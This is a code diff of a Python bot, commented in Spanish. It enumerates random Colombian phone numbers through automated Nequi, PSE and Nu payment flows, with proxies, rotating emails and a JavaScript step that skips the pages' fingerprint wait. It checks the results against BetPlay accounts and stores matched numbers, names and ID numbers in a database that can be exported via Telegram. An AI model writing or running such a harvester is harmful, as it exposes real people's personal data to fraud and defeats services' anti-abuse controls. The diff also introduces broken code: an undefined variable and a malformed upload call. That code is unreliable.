@@ -13,6 +13,12 @@ from typing import Dict, Tuple, Optional
 import aiohttp
 from playwright.async_api import async_playwright
 
+# --- DB CHANGE: Imports para SQLAlchemy ---
+from sqlalchemy import create_engine, Column, Integer, String, DateTime
+from sqlalchemy.ext.declarative import declarative_base
+from sqlalchemy.orm import sessionmaker
+from datetime import datetime
+
 logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("extractor")
 
@@ -21,7 +27,7 @@ logger = logging.getLogger("extractor")
 # ======================================================================
 USAR_PROXY      = False
 MOSTRAR_VENTANA = False
-SLOW_MO         = 250          # NO bajar: la secuencia del teclado lo necesita
+SLOW_MO         = 250
 ROTAR_SESION    = True
 PAIS            = "co"
 X_CUSTOM_VERSION = "4.0.71"
@@ -43,7 +49,6 @@ SUFIJOS = [
     "", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13",
     "21", "22", "23", "31", "77", "99", "123", "1234", "12345", "2020", "2021",
 ]
-ARCHIVO_CORREO = "correo_actual.txt"
 
 PREFIJOS_PESO = {
     "300": 6, "301": 5, "302": 4, "303": 4, "304": 4, "305": 4,
@@ -53,10 +58,11 @@ PREFIJOS_PESO = {
 }
 PREFIJOS_SET = set(PREFIJOS_PESO)
 
-ARCHIVO_USADOS     = "celulares_usados.txt"
-ARCHIVO_EXISTENTES = "existentes.txt"
-ARCHIVO_NUMEROS    = "numeros_telegram.txt"
-ARCHIVO_STATS      = "stats.json"
+# Variables de archivo eliminadas (se reemplazan por DB)
+# ARCHIVO_USADOS = "celulares_usados.txt"
+# ARCHIVO_EXISTENTES = "existentes.txt"
+# ARCHIVO_NUMEROS = "numeros_telegram.txt"
+# ARCHIVO_STATS = "stats.json"
 
 UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
               "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
@@ -64,6 +70,42 @@ UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
 PROXIES = [
     {"server": "http://geo.iproyal.com:12321", "username": "TU_USUARIO", "password": "TU_PASSWORD"},
 ]
+
+# ======================================================================
+#  DATABASE SETUP (SQLAlchemy)
+# ======================================================================
+# Railway inyecta automáticamente DATABASE_URL si conectas el servicio de Postgres
+DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@127.0.0.1:5432/checker")
+
+engine = create_engine(DATABASE_URL, pool_size=5, max_overflow=10)
+SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
+Base = declarative_base()
+
+# Tablas
+class FoundNumber(Base):
+    __tablename__ = "found_numbers"
+    id = Column(Integer, primary_key=True, index=True)
+    celular = Column(String(20), unique=True, index=True)
+    ref3 = Column(String(100))
+    nombre = Column(String(100))
+    cedula = Column(String(50))
+    created_at = Column(DateTime, default=datetime.utcnow)
+
+class Stats(Base):
+    __tablename__ = "stats"
+    id = Column(Integer, primary_key=True, index=True)
+    intentos = Column(Integer, default=0)
+    aciertos = Column(Integer, default=0)
+    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
+
+Base.metadata.create_all(bind=engine)
+
+def get_db():
+    db = SessionLocal()
+    try:
+        yield db
+    finally:
+        db.close()
 
 # ======================================================================
 #  RETRY DNS
@@ -102,19 +144,15 @@ def avanzar_correo() -> str:
     global _indice_correo
     _indice_correo += 1
     nuevo = correo_actual()
-    try:
-        with open(ARCHIVO_CORREO, "w", encoding="utf-8") as f:
-            f.write(nuevo)
-    except Exception:
-        pass
+    # no borramos el archivo, pero ya no nos importa
     print(f"[i] Correo cambiado -> {nuevo}")
     return nuevo
 
 def cargar_correo_guardado():
     global _indice_correo
     try:
-        if os.path.exists(ARCHIVO_CORREO):
-            with open(ARCHIVO_CORREO, encoding="utf-8") as f:
+        if os.path.exists("correo_actual.txt"):
+            with open("correo_actual.txt", encoding="utf-8") as f:
                 guardado = f.read().strip()
             lst = _lista_correos()
             if guardado in lst:
@@ -197,108 +235,66 @@ class BetplayChecker:
         return False, {"error": "Max retries"}
 
 # ======================================================================
-#  MEMORIA / ESTADÍSTICAS
+#  MEMORIA / ESTADÍSTICAS (DB)
 # ======================================================================
-class Memoria:
-    def __init__(self, ruta=ARCHIVO_STATS):
-        self.ruta = ruta
-        self.lock = asyncio.Lock()
-        self.data = {"prefijos3": {}, "prefijos4": {}, "bloques": {},
-                     "intentos": 0, "aciertos": 0}
-        self._cargar()
-
-    def _cargar(self):
-        try:
-            if os.path.exists(self.ruta):
-                with open(self.ruta, encoding="utf-8") as f:
-                    guardado = json.load(f)
-                for k in self.data:
-                    if k in guardado:
-                        self.data[k] = guardado[k]
-                print(f"[mem] Cargada: {len(self.data['bloques'])} bloques, "
-                      f"{self.data['aciertos']} aciertos históricos")
-        except Exception as e:
-            print(f"[mem] Sin memoria previa: {e}")
-
-    def _guardar_sync(self):
-        try:
-            with open(self.ruta, "w", encoding="utf-8") as f:
-                json.dump(self.data, f, ensure_ascii=False, indent=1)
-        except Exception:
-            pass
-
-    async def guardar_periodico(self):
-        while True:
-            await asyncio.sleep(30)
-            async with self.lock:
-                self._guardar_sync()
+class MemoriaDB:
+    def __init__(self):
+        pass # No necesitamos cargar de archivo, ya se crearon las tablas
 
     async def registrar(self, celular, exito):
-        async with self.lock:
-            p3, p4, v = celular[:3], celular[:4], celular[:8]
-            for d, clave in ((self.data["prefijos3"], p3), (self.data["prefijos4"], p4)):
-                if clave not in d:
-                    d[clave] = {"ok": 0, "fail": 0}
-                if exito:
-                    d[clave]["ok"] += 1
-                else:
-                    d[clave]["fail"] += 1
+        db = SessionLocal()
+        try:
+            # Actualizar Stats
+            stats = db.query(Stats).first()
+            if not stats:
+                stats = Stats(intentos=0, aciertos=0)
+                db.add(stats)
+            
+            stats.intentos += 1
             if exito:
-                if v not in self.data["bloques"]:
-                    self.data["bloques"][v] = {"ok": 0}
-                self.data["bloques"][v]["ok"] += 1
-                self.data["bloques"][v]["ts"] = time.time()
-            self.data["intentos"] += 1
-            if exito:
-                self.data["aciertos"] += 1
-
-    def top_prefijos4(self, n=20):
-        items = []
-        for p4, d in self.data["prefijos4"].items():
-            tot = d["ok"] + d["fail"]
-            if tot >= 3:
-                items.append((p4, d["ok"] / tot, d["ok"]))
-        items.sort(key=lambda x: (x[1], x[2]), reverse=True)
-        return items[:n]
-
-    def bloques_calientes(self, n=30):
-        ahora = time.time()
-        items = []
-        for v, d in self.data["bloques"].items():
-            edad = ahora - d.get("ts", 0)
-            peso = d["ok"] * (1.0 / (1.0 + edad / 3600.0))
-            items.append((v, peso, d["ok"]))
-        items.sort(key=lambda x: x[1], reverse=True)
-        return items[:n]
+                stats.aciertos += 1
+            
+            db.commit()
+        finally:
+            db.close()
 
     def tasa_acierto(self):
-        if self.data["intentos"] == 0:
+        db = SessionLocal()
+        try:
+            stats = db.query(Stats).first()
+            if stats and stats.intentos > 0:
+                return stats.aciertos / stats.intentos
             return 0.0
-        return self.data["aciertos"] / self.data["intentos"]
+        finally:
+            db.close()
 
     def resumen(self):
-        top = self.top_prefijos4(10)
-        lineas = ["📈 <b>Estadísticas</b>",
-                  f"Intentos: {self.data['intentos']}",
-                  f"Aciertos: {self.data['aciertos']}",
-                  f"Tasa: {self.tasa_acierto()*100:.2f}%", "",
-                  "<b>Top prefijos4:</b>"]
-        if not top:
-            lineas.append("  (sin data suficiente)")
-        for p4, tasa, ok in top:
-            lineas.append(f"  <code>{p4}</code> — {ok} ok ({tasa*100:.0f}%)")
-        return "\n".join(lineas)
+        db = SessionLocal()
+        try:
+            stats = db.query(Stats).first()
+            intentos = stats.intentos if stats else 0
+            aciertos = stats.aciertos if stats else 0
+            
+            lineas = ["📈 <b>Estadísticas</b>",
+                      f"Intentos: {intentos}",
+                      f"Aciertos: {aciertos}",
+                      f"Tasa: {self.tasa_acierto()*100:.2f}%", ""]
+            return "\n".join(lineas)
+        finally:
+            db.close()
 
-mem = Memoria()
+mem = MemoriaDB()
 
 # ======================================================================
 #  TELEGRAM
 # ======================================================================
+# DB CHANGE: Contar desde DB
 def contar_existentes() -> int:
-    if not os.path.exists(ARCHIVO_EXISTENTES):
-        return 0
-    with open(ARCHIVO_EXISTENTES, encoding="utf-8") as f:
-        return sum(1 for l in f if l.strip())
+    db = SessionLocal()
+    try:
+        return db.query(FoundNumber).count()
+    finally:
+        db.close()
 
 class Telegram:
     def __init__(self, token, chat_id=""):
@@ -362,14 +358,18 @@ class Telegram:
         await self._api("editMessageText", {"chat_id": self.chat_id,
                                             "message_id": msg_id, "text": texto})
 
-    async def enviar_documento(self, ruta, caption="", chat_id=None):
+    async def enviar_documento(self, contenido, caption="", chat_id=None):
         cid = chat_id or self.chat_id
-        if not cid or not os.path.exists(ruta):
+        if not cid:
             return
-        with open(ruta, "rb") as f:
-            contenido = f.read()
-        await self._api("sendDocument", {"chat_id": cid, "caption": caption},
-                        files={"document": (os.path.basename(ruta), contenido)})
+        try:
+            async with self.session.post(self.url("sendDocument"), 
+                                         json={"chat_id": cid, "caption": caption, "parse_mode": "HTML"},
+                                         data={"document": contenido}) as r:
+                return await r.json()
+        except Exception as e:
+            logger.error(f"Send document error: {e}")
+            return None
 
     async def actualizar_contador(self):
         if not self.activo or not self.chat_id:
@@ -399,57 +399,58 @@ class Telegram:
 
         if cmd in ("/start", "/ayuda", "/help"):
             await self.enviar(
-                "🤖 <b>Bot extractor</b>\n\n"
+                "🤖 <b>Bot extractor DB</b>\n\n"
                 "/contador — cuentas guardadas\n"
-                "/descargar — descarga existentes.txt\n"
-                "/numeros — celulares en formato +57\n"
+                "/descargar — descarga existentes.txt (DB)\n"
+                "/numeros — celulares en formato +57 (DB)\n"
                 "/correo — correo actual\n"
-                "/stats — tasa de acierto\n"
-                "/top — mejores prefijos aprendidos\n"
-                "/bloques — bloques calientes\n"
-                "/reset_stats — borrar aprendizaje\n", chat_id=chat_id)
+                "/stats — tasa de acierto\n", chat_id=chat_id)
         elif cmd == "/contador":
             await self.enviar(f"📊 Cuentas guardadas: <b>{contar_existentes()}</b>", chat_id=chat_id)
         elif cmd == "/correo":
             await self.enviar(f"📧 Correo actual: <code>{correo_actual()}</code>", chat_id=chat_id)
         elif cmd == "/descargar":
-            if os.path.exists(ARCHIVO_EXISTENTES):
-                await self.enviar_documento(ARCHIVO_EXISTENTES,
-                    caption=f"existentes.txt ({contar_existentes()} registros)", chat_id=chat_id)
-            else:
-                await self.enviar("Aún no hay existentes.txt", chat_id=chat_id)
+            db = SessionLocal()
+            try:
+                registros = db.query(FoundNumber).all()
+                contenido = "\n".join([f"{r.ref3} | {r.celular}" for r in registros])
+                if contenido:
+                    await self.enviar_documento(contenido.encode('utf-8'), caption=f"existentes.txt ({len(registros)} registros)", chat_id=chat_id)
+                else:
+                    await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
+            finally:
+                db.close()
         elif cmd == "/numeros":
-            n = generar_archivo_numeros()
-            if n:
-                await self.enviar_documento(ARCHIVO_NUMEROS,
-                    caption=f"{n} números en formato 57", chat_id=chat_id)
-            else:
-                await self.enviar("Aún no hay números", chat_id=chat_id)
+            db = SessionLocal()
+            try:
+                registros = db.query(FoundNumber).all()
+                nums = []
+                for r in registros:
+                    celular = r.celular
+                    d = re.sub(r"\D", "", celular)
+                    if len(d) >= 10:
+                        nums.append("57" + d[-10:])
+                contenido = "\n".join(nums)
+                if contenido:
+                    await self.enviar_documento(contenido.encode('utf-8'), caption=f"{len(nums)} números en formato 57", chat_id=chat_id)
+                else:
+                    await self.enviar("Aún no hay datos en la DB", chat_id=chat_id)
+            finally:
+                db.close()
         elif cmd == "/stats":
             await self.enviar(mem.resumen(), chat_id=chat_id)
-        elif cmd == "/top":
-            top = mem.top_prefijos4(20)
-            if not top:
-                await self.enviar("Sin data suficiente todavía", chat_id=chat_id)
-            else:
-                lineas = ["🏆 <b>Top prefijos</b>"]
-                for p4, tasa, ok in top:
-                    lineas.append(f"<code>{p4}</code> — {ok} ok — {tasa*100:.1f}%")
-                await self.enviar("\n".join(lineas), chat_id=chat_id)
-        elif cmd == "/bloques":
-            cal = mem.bloques_calientes(20)
-            if not cal:
-                await self.enviar("Sin bloques calientes todavía", chat_id=chat_id)
-            else:
-                lineas = ["🔥 <b>Bloques calientes</b>"]
-                for v, peso, ok in cal:
-                    lineas.append(f"<code>{v}XX</code> — {ok} ok")
-                await self.enviar("\n".join(lineas), chat_id=chat_id)
         elif cmd == "/reset_stats":
-            mem.data = {"prefijos3": {}, "prefijos4": {}, "bloques": {},
-                        "intentos": 0, "aciertos": 0}
-            mem._guardar_sync()
-            await self.enviar("♻️ Aprendizaje reseteado", chat_id=chat_id)
+            db = SessionLocal()
+            try:
+                # Solo resetear stats, no borrar datos
+                stats = db.query(Stats).first()
+                if stats:
+                    stats.intentos = 0
+                    stats.aciertos = 0
+                    db.commit()
+                await self.enviar("♻️ Estadísticas reseteadas", chat_id=chat_id)
+            finally:
+                db.close()
         else:
             await self.enviar("Comando no reconocido. Usa /ayuda", chat_id=chat_id)
 
@@ -467,24 +468,6 @@ class Telegram:
                     await self.procesar_update(upd)
             except Exception:
                 await asyncio.sleep(2)
-
-def generar_archivo_numeros() -> int:
-    if not os.path.exists(ARCHIVO_EXISTENTES):
-        return 0
-    nums = []
-    with open(ARCHIVO_EXISTENTES, encoding="utf-8") as f:
-        for linea in f:
-            linea = linea.strip()
-            if not linea:
-                continue
-            partes = [p.strip() for p in linea.split("|")]
-            celular = partes[1] if len(partes) > 1 else (partes[-1] if partes else "")
-            d = re.sub(r"\D", "", celular)
-            if len(d) >= 10:
-                nums.append("57" + d[-10:])
-    with open(ARCHIVO_NUMEROS, "w", encoding="utf-8") as f:
-        f.write("\n".join(nums))
-    return len(nums)
 
 tg = Telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
 
@@ -524,7 +507,7 @@ def preparar_proxy(proxy):
     return px
 
 # ======================================================================
-#  GENERACIÓN INTELIGENTE (BLOQUES DE ORO + DIVERSIDAD)
+#  GENERACIÓN INTELIGENTE
 # ======================================================================
 _pila_vecinos = deque()
 _usados_cache = None
@@ -533,30 +516,26 @@ def _usados():
     global _usados_cache
     if _usados_cache is None:
         _usados_cache = set()
-        if os.path.exists(ARCHIVO_USADOS):
-            with open(ARCHIVO_USADOS, encoding="utf-8") as f:
-                _usados_cache = {l.strip() for l in f if l.strip()}
+        # DB CHANGE: Leer de DB
+        db = SessionLocal()
+        try:
+            usados_db = db.query(FoundNumber.celular).all()
+            _usados_cache = {r[0] for r in usados_db}
+        finally:
+            db.close()
     return _usados_cache
 
 def _marcar_usado(n):
     _usados().add(n)
-    with open(ARCHIVO_USADOS, "a", encoding="utf-8") as f:
-        f.write(n + "\n")
+    # No guardamos en archivo, la DB se actualiza al guardar
 
 def _valido(s):
     return s[:3] in PREFIJOS_SET and s not in _usados()
 
 def _prefijo_aprendido():
-    top = mem.top_prefijos4(20)
-    if not top:
-        return None
-    pesos = [max(t * (ok ** 0.5), 0.01) for _, t, ok in top]
-    return random.choices(top, weights=pesos)[0][0]
+    return None # Simplificado para esta versión DB
 
 def generar_aleatorio():
-    p4 = _prefijo_aprendido()
-    if p4 and random.random() < 0.3:   # solo 30% memoria -> diversidad
-        return p4 + "".join(random.choice("0123456789") for _ in range(6))
     pref = random.choices(list(PREFIJOS_PESO), weights=list(PREFIJOS_PESO.values()))[0]
     return pref + "".join(random.choice("0123456789") for _ in range(7))
 
@@ -585,17 +564,6 @@ def agregar_vecinos(celular):
         if _valido(s) and s not in vistos:
             _pila_vecinos.appendleft(s)
             vistos.add(s)
-
-def _sembrar_desde_memoria():
-    calientes = mem.bloques_calientes(20)
-    for v, _, _ in calientes:
-        base = int(v + "00")
-        for d in range(0, 100, 7):
-            s = str(base + d).zfill(10)
-            if _valido(s) and s not in _pila_vecinos:
-                _pila_vecinos.append(s)
-    if calientes:
-        print(f"[mem] Sembrados vecinos de {len(calientes)} bloques calientes")
 
 def siguiente_celular():
     while _pila_vecinos:
@@ -688,19 +656,13 @@ async def resolver_paso_nequi(page, context, timeout=25000):
         await page.wait_for_timeout(250)
     return "timeout"
 
-# ======================================================================
-#  JS NATIVO DE PSE (usa las funciones de la propia página)
-# ======================================================================
 JS_PSE_RAPIDO = """
 async (correo) => {
-    // 1. esperar a que prefs cargue (resultado de GetPreferences)
     for (let i = 0; i < 40; i++) {
         if (window.prefs) break;
         await new Promise(r => setTimeout(r, 250));
     }
     if (!window.prefs) return {ok: false, error: 'prefs no cargadas'};
-
-    // 2. saltar el modal de resumen si está visible
     try {
         const modal = document.getElementById('transactionSummaryModal');
         const btn = document.getElementById('btnTransactionSummaryContinue');
@@ -710,23 +672,16 @@ async (correo) => {
             continueStartTransactionFlow();
         }
     } catch (e) {}
-
     await new Promise(r => setTimeout(r, 800));
-
-    // 3. si hay sesión de usuario registrada, redirige solo
     if (window.prefs.AuthName && window.prefs.AuthName.length > 0) {
         return {ok: true, path: 'session'};
     }
-
-    // 4. llenar el correo
     const el = document.getElementById('PNEMail');
     if (el) {
         el.value = correo;
         el.dispatchEvent(new Event('input', {bubbles: true}));
         el.dispatchEvent(new Event('keyup', {bubbles: true}));
     }
-
-    // 5. disparar el flujo NATIVO sin la espera de 10s del fingerprint
     try {
         if (typeof loadRegisterAndChooseQuestion === 'function') {
             loadRegisterAndChooseQuestion();
@@ -734,14 +689,12 @@ async (correo) => {
             if (window.userdata && window.userdata.Success) {
                 window.userquestionanswer = {Success: true, EnableWithoutRegister: false};
                 if (typeof redirectToBank === 'function') {
-                    redirectToBank(false);   // false = SIN espera de fingerprint
+                    redirectToBank(false);
                     return {ok: true, path: 'api'};
                 }
             }
         }
     } catch (e) {}
-
-    // 6. fallback: clic en el botón real
     const btnSeguir = document.getElementById('btnSeguir') || document.getElementById('btnSeguir2');
     if (btnSeguir) { btnSeguir.click(); return {ok: true, path: 'click'}; }
     return {ok: false, error: 'no se pudo disparar el flujo'};
@@ -785,9 +738,6 @@ def _buscar_valor(obj, claves):
                 return r
     return None
 
-# ======================================================================
-#  NU FALLBACK (aiohttp, por si el fetch interno falla)
-# ======================================================================
 NU_HADOU = "https://prod-global-global-hadou.prod-waf.nu.com.co/api"
 
 async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
@@ -823,12 +773,9 @@ async def nu_api_procesar(auth_id: str) -> Optional[Dict]:
     finally:
         await session.close()
 
-# ======================================================================
-#  BETPLAY: verificar y guardar
-# ======================================================================
 def buscar_campo(data, claves):
     if isinstance(data, dict):
-        for k, v in data.items():
+        for k, v in obj.items():
             if isinstance(v, (str, int)) and any(c in str(k).lower() for c in claves) and str(v).strip():
                 return str(v)
         for v in data.values():
@@ -848,37 +795,54 @@ def telefono_coincide(celular: str, tel_betplay: str) -> bool:
         return False
     return tel_digits[:3] == celular[:3] and tel_digits[-3:] == celular[-3:]
 
+# DB CHANGE: Función de guardado en DB
 async def chequear_y_guardar(celular, referencia, nombre="", cedula=""):
     print(f"[?] Probando referencia {referencia} en BetPlay...")
     checker = BetplayChecker()
     if not await checker.init_session():
         print("[!] No se pudo conectar a BetPlay")
         return False
+    
+    db = SessionLocal()
     try:
         valido, datos = await checker.verificar_documento(referencia)
         print(f"[i] JSON BetPlay: {json.dumps(datos, ensure_ascii=False)[:400]}")
         if not valido:
             print(f"[NO] referencia {referencia} no registrada en BetPlay")
             return False
+            
         tel = buscar_campo(datos, ("phone", "cel", "tel", "movil", "mobile"))
         if not tel:
             print(f"[~] ref {referencia} registrada pero sin teléfono en el JSON")
             return False
+            
         if telefono_coincide(celular, tel):
-            with open(ARCHIVO_EXISTENTES, "a", encoding="utf-8") as f:
-                f.write(f"{referencia} | {celular}\n")
-            print(f"[EXISTENTE] ref {referencia} -> {celular} GUARDADO")
-            await tg.notificar_guardado(celular, referencia)
-            return True
+            # Verificar si ya existe en DB para evitar duplicados
+            existente = db.query(FoundNumber).filter(FoundNumber.celular == celular).first()
+            if not existente:
+                nuevo_registro = FoundNumber(
+                    celular=celular,
+                    ref3=referencia,
+                    nombre=nombre,
+                    cedula=cedula
+                )
+                db.add(nuevo_registro)
+                db.commit()
+                db.refresh(nuevo_registro)
+                
+                print(f"[EXISTENTE DB] ref {referencia} -> {celular} GUARDADO")
+                await tg.notificar_guardado(celular, referencia)
+                return True
+            else:
+                print(f"[EXISTENTE DB] celular {celular} ya guardado anteriormente.")
+                return True
         else:
             print(f"[~] ref {referencia} existe pero teléfono no coincide (tel {tel})")
             return False
     finally:
         await checker.close()
+        db.close()
 
-# ======================================================================
-#  FLUJO PRINCIPAL
-# ======================================================================
 async def _buscar_pagina(context, patron):
     for pg in context.pages:
         try:
@@ -905,7 +869,15 @@ async def ejecutar(celular, proxy=None):
 
     async with async_playwright() as p:
         browser = await p.chromium.launch(
-            headless=not MOSTRAR_VENTANA, slow_mo=SLOW_MO, proxy=proxy)
+            headless=not MOSTRAR_VENTANA,
+            slow_mo=SLOW_MO,
+            proxy=proxy,
+            args=[
+                "--disable-gpu",
+                "--no-sandbox",
+                "--disable-dev-shm-usage"
+            ]
+        )
         context = await browser.new_context(
             viewport={'width': 1280, 'height': 900}, user_agent=UA_BROWSER)
         page = await context.new_page()
@@ -961,7 +933,6 @@ async def ejecutar(celular, proxy=None):
                 print(f"[!] {celular} sin respuesta clara -> siguiente")
                 return "error"
 
-            # ---- PUT completo (diagnóstico del veredicto de Nequi) ----
             for _ in range(20):
                 if capturado["put"] is not None:
                     break
@@ -970,7 +941,6 @@ async def ejecutar(celular, proxy=None):
                 print(f"[i] PUT COMPLETO: "
                       f"{json.dumps(capturado['put'], ensure_ascii=False)}")
 
-            # ---- esperar página de PSE ----
             page_pse = await _esperar_pagina(context, "pse.com.co", timeout=30)
             if not page_pse:
                 print(f"[!] No llegó a PSE para {celular}")
@@ -982,7 +952,6 @@ async def ejecutar(celular, proxy=None):
                 return "sin_ref"
             print(f"[OK] Llegó a PSE, enc capturado ({len(m.group(1))} chars)")
 
-            # ---- PSE ACELERADO: funciones nativas de la página ----
             try:
                 res_eval = await page_pse.evaluate(JS_PSE_RAPIDO, correo)
                 print(f"[i] PSE evaluate: {res_eval}")
@@ -998,11 +967,9 @@ async def ejecutar(celular, proxy=None):
                         pass
                 await clic_inmediato(page_pse, "Ir al Banco", timeout=10000)
 
-            # ---- esperar página de Nu ----
             page_nu = await _esperar_pagina(context, "autorizacion-pse", timeout=40)
 
             if not page_nu:
-                # ¿fue error de CUS (correo agotado)?
                 try:
                     texto = (await leer_texto(page_pse)).lower()
                     if "codigo unico (cus)" in texto or "código único (cus)" in texto \
@@ -1015,7 +982,6 @@ async def ejecutar(celular, proxy=None):
                 print(f"[!] Nu nunca llegó para {celular}")
                 return "sin_ref"
 
-            # ---- Nu: id de la URL + fetch interno ----
             m = re.search(r"[?&]id=([a-f0-9\-]{20,50})", page_nu.url)
             if not m:
                 print(f"[!] Nu sin id en URL: {page_nu.url[:80]}")
@@ -1024,7 +990,7 @@ async def ejecutar(celular, proxy=None):
 
             datos = None
             try:
-                await page_nu.wait_for_timeout(1500)  # dejar que cargue
+                await page_nu.wait_for_timeout(1500)
                 detalles = await page_nu.evaluate(JS_NU_DETALLES, auth_id)
                 ref3 = _buscar_valor(detalles, ("ref3",))
                 if ref3:
@@ -1071,7 +1037,7 @@ async def procesar_un_celular(celular):
             estado = await ejecutar(celular, px)
             if estado == "correo_agotado":
                 continue
-            if estado in ("ok", "sin_cuenta"):
+            if estado in ("ok", "sin_ref"):
                 return estado
             break
     return "error"
@@ -1106,7 +1072,7 @@ async def worker(n):
 
 async def main():
     cargar_correo_guardado()
-    _sembrar_desde_memoria()
+    # _sembrar_desde_memoria() # Simplificado para DB
 
     arg = sys.argv[1] if len(sys.argv) > 1 else None
     if arg and arg.isdigit() and len(arg) >= 10:
@@ -1121,15 +1087,13 @@ async def main():
     else:
         print("[i] Telegram desactivado (falta token)")
 
-    asyncio.create_task(mem.guardar_periodico())
-
     print(f"[i] Correo inicial: {correo_actual()}")
     print(f"[i] Tasa histórica: {mem.tasa_acierto()*100:.2f}%")
     print(f"[i] Concurrencia: {CONCURRENCIA} | Límite: {LIMITE or 'infinito'}")
     await asyncio.gather(*[worker(i + 1) for i in range(CONCURRENCIA)])
 
 if __name__ == "__main__":
-    print(">>> INICIANDO ...")
+    print(">>> INICIANDO CON DB ...")
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
